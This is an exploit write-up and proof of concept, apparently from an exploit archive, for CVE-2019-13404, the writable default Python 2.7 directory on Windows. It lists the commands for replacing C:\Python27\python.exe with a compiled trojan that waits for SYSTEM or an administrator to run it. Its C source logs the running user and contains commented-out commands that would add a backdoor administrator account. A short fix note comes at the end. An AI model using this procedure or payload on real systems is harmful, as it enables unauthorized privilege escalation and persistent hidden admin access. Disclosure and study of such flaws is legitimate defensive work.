/*
# Exploit Title: Python 2.7.x < 3.5 Privilege Escalation (Windows)
# Date: July 8, 2019
# Exploit Author: Ali Dinifar
# Vendor Homepage: https://www.python.org
# Software Link: https://www.python.org/download/releases/2.7/
# Version: 2.7.x and old 3.x releases before 3.5
# Tested on: Windows 10
# CVE : CVE-2019-13404

The MSI installer for Python through 2.7.16 on Windows defaults to the C:\Python27 directory,
which makes it easier for local users to deploy Trojan horse code. (This also affects old 3.x releases before 3.5.)

NOTE:
the vendor's position is that it is the user's responsibility to ensure C:\Python27 access control
or choose a different directory, because backwards compatibility requires that C:\Python27 remain the default for 2.7.x.

PoC:
1-Compile the exploit code:
gcc exploit.c -o exploit.exe

2-Rename "exploit.exe" to "python.exe":
rename "exploit.exe" "python.exe"

3-Backup Python executable file "C:\Python27\python.exe":
copy "C:\Python27\python.exe" "python.exe.bak"

4-Replace "C:\Python27\python.exe" with renamed file:
copy /y "python.exe" "C:\Python27\python.exe"

5-Wait for a user ("SYSTEM" user for services or an Administrator
user) to execute python.exe (the malicious file). Users executing the
malicious file will be logged in C:\Python27\Exploited_Users.txt text
file.

Exploited_Users.txt:

desktop-ai7lm81\test
nt authority\system <Privilege Escalation>
desktop-ai7lm81\admin <Privilege Escalation>


6-Restore the original Python executable file after Privilege Escalation:
copy /y "python.exe.bak" "C:\Python27\python.exe"

How to fix the issue?
Don't use default installation path and install Python under 
"C:\Program Files" or "C:\Program Files (x86)" as these paths are write-protected.

*/

//exploit.c
#include <stdlib.h>

int main()
{
system("whoami >> C:\\Python27\\Exploited_Users.txt");
/*
if( username=="SYSTEM" || IsAdministrator(username) ){
//Privilege Escalation!
system("net user /add exploited exploited"); //Create user "exploited" and set password to "exploited".
system("net localgroup administrators exploited /add"); //add "exploited" user to administrators group.
}
*/
return 0;
}

